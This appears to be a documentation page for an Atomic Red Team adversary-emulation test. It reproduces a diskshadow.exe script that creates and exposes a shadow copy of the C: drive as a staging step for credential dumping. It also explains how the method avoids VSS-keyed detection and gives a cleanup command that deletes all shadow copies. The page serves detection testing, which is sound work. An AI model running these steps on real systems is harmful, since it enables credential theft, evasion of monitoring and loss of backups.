# diskshadow

`diskshadow.exe` script used to create and expose a Volume Shadow Copy as an alternative to `vssadmin.exe` / `wmic shadowcopy`.

## Provenance

| Field | Value |
|---|---|
| Source | `atomic-red-team/atomics/T1003.003/src/diskshadow.txt` (repo-local copy) |
| Used by | Atomic Red Team `T1003.003` #9 (GUID `b385996c`) |

`diskshadow.exe` takes the script via `/s <file>`; the script contents are never visible on a process command line.

## Contents

```
set context persistent nowriters
set metadata C:\exfil\metadata.cab
add volume c: alias loot
create
expose %loot% s:
```

- `C:\exfil` must exist (ART test creates it with `mkdir c:\exfil`).
- The alias is exposed as drive `s:` (the ART markdown variant uses `x:` — either is fine).

## Usage

```cmd
mkdir c:\exfil
copy diskshadow.txt c:\exfil\diskshadow.txt
diskshadow.exe /s c:\exfil\diskshadow.txt
```

Cleanup: `vssadmin delete shadows /all /quiet` (or `diskshadow.exe /s` with a delete script) and remove `C:\exfil`.

## Why diskshadow instead of vssadmin / wmic

The VSS snapshot operation is carried entirely in the script file: only `diskshadow.exe /s <script path>` appears on the command line, which contains no VSS-related wording and no `win32_shadowcopy` class reference. Tools that key on conventional VSS command lines (`vssadmin.exe`, `wmic shadowcopy`, `esentutl /vss`) therefore produce different telemetry for the same effect.
